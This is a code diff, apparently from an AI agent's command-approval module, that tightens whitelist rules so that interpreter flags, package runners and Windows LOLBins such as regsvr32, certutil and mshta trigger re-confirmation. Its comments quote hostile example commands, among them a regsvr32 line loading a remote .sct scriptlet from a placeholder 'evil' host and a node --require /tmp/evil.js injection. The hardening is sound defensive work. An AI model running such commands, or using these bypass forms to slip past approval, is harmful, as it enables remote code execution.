@@ -80,6 +80,20 @@ _CODE_EXEC_FLAGS = frozenset({
     "-command", "-encodedcommand", "--eval", "--command",
 })
 
+# 解释器调用**全文扫描**时额外识别的「下一参数即任意代码/任意脚本」旗标。
+# 与 _CODE_EXEC_FLAGS 分开：这些词在普通工具里是常见参数（tar -f / curl -f），
+# 只对解释器（_INTERPRETER_COMMANDS）的调用启用，避免把正常命令误伤成 exact。
+# -m：python -m <任意模块>（与 python -c 同级入口，此前漏判）
+# -file/--file/-f：powershell/pwsh 加载任意脚本（-f 是 -File 的官方缩写）
+_INTERPRETER_EXTRA_FLAGS = frozenset({
+    "-m", "-file", "--file", "-f",
+    # deno eval / bun eval：第二词就是子命令，后接任意 JS
+    "eval",
+    # node --require / --import / --loader：脚本名之后仍可加载任意模块执行代码
+    # （`node build.js --require /tmp/evil.js` 与 `node -e <代码>` 等效）
+    "--require", "--import", "--loader",
+})
+
 # 解释器/shell 可执行名（小写）：旗标全文扫描只对以它们开头的命令放开。
 # 这类调用的旗标可以出现在任意位置（`py -3 -X utf8 -c`、
 # `powershell -NoProfile -ExecutionPolicy Bypass -Command` 的旗标都在第 5 词），
@@ -103,7 +117,21 @@ _INTERPRETER_COMMANDS = frozenset({
 # pods` → "kubectl get"，放行面 = 同一动词的任意参数），比 docker/ssh 的
 # 「第二词之后即任意执行面」窄，保留两词前缀（apply/exec 等动词仍有变更面，
 # 靠逐次确认兜底——产品拍板的取舍）。带 .exe 后缀与路径前缀的形态一并识别。
-_PREFIX_UNSAFE_COMMANDS = frozenset({"docker", "ssh", "scp"})
+#
+# 对抗性审查补充（前三类此前漏判，已用 rule_for + matches 端到端复现）：
+# - wsl：`wsl -d <distro> <任意命令>` 是任意 Linux 执行面（与 ssh host 同构）；
+# - npx/uvx/bunx：下载并运行任意远程包（与 docker run 同构）；
+# - go/make：`go run <任意 .go>`、`make -f <任意 makefile>` 都是任意代码执行
+#   （此前提炼出 `go run` / `make -f` 两词前缀，批准一次即放行同前缀任意目标）；
+# - LOLBin（regsvr32/certutil/mshta/rundll32）：固定旗标 + 任意 URL/脚本路径
+#   （`regsvr32 /s /u /i:http://evil/x.sct scrobj.dll` 类），旗标本身不代码执行，
+#   但后面参数即任意远程加载面。
+_PREFIX_UNSAFE_COMMANDS = frozenset({
+    "docker", "ssh", "scp",
+    "wsl", "npx", "uvx", "bunx",
+    "go", "make",
+    "regsvr32", "certutil", "mshta", "rundll32",
+})
 
 
 def _norm_exe_name(word: str) -> str:
@@ -180,8 +208,14 @@ def _has_code_exec_flag(text: str, head: int = 4) -> bool:
     全词扫描会误伤正常命令。
     """
     words = _tokenize(text)
-    limit = len(words) if _interpreter_invocation(text) else head
-    return any(w.lower() in _CODE_EXEC_FLAGS for w in words[:limit])
+    if _interpreter_invocation(text):
+        # 解释器调用：全文扫描通用旗标 + 解释器专属旗标（-m/-File/-f/eval）
+        for w in words:
+            low = w.lower()
+            if low in _CODE_EXEC_FLAGS or low in _INTERPRETER_EXTRA_FLAGS:
+                return True
+        return False
+    return any(w.lower() in _CODE_EXEC_FLAGS for w in words[:head])
 
 
 # 固定落点写在引擎主目录（~/.skysheep[-instance]）的工具：没有路径参数，
@@ -296,6 +330,25 @@ def _chain_hint() -> str:
     if _IS_WINDOWS:
         return base + "，以及单引号 ' 与 %VAR% 环境变量展开、脱字符 ^ 转义"
     return base + "，以及反斜杠 \\ 转义"
+
+
+def _has_extra_flag_after_script(text: str) -> bool:
+    """解释器调用是否在"脚本名"之后又带了额外 - 旗标。
+
+    用户批准的 `python manage.py runserver` / `bash setup.sh` 是"运行这个脚本"；
+    之后追加的 - 旗标会改变解释器行为、可能引入额外代码（`bash setup.sh --evil`、
+    `node build.js --require /tmp/x`——后者已由 _INTERPRETER_EXTRA_FLAGS 覆盖，
+    这里兜住其余未列举的旗标面）。命中即退回逐次确认，方向 fail-closed。
+
+    只看第 3 词起：第 1 词是解释器、第 2 词是脚本名/子命令，这两词本身以 -
+    开头的情况（`python -m`）已由 _has_code_exec_flag 负责。
+    """
+    if not _interpreter_invocation(text):
+        return False
+    words = _tokenize(text)
+    if len(words) < 3:
+        return False
+    return any(w.startswith("-") and not w.isdigit() for w in words[2:])
 
 
 def _prefix_match(text: str, pattern: str) -> bool:
@@ -420,6 +473,11 @@ class WhitelistRule:
             # 历史遗留的 docker/ssh/scp 两词前缀规则不再命中（审查项 12）：
             # 第二词之后即任意执行/任意文件面，存量规则一并失效、回落逐次确认
             if tool_name == _RUN_COMMAND and _is_arbitrary_exec_prefix(self.pattern):
+                return False
+            # 解释器前缀规则的变体防护：`bash setup.sh` 的规则不放行
+            # `bash setup.sh --evil`——脚本名之后追加的旗标会改变解释器行为
+            # （可能引入额外代码），用户批准的是"跑这个脚本"，加参数就该重新确认
+            if tool_name == _RUN_COMMAND and _has_extra_flag_after_script(arg_text):
                 return False
             return _prefix_match(arg_text, self.pattern)
         if self.kind == "exact":
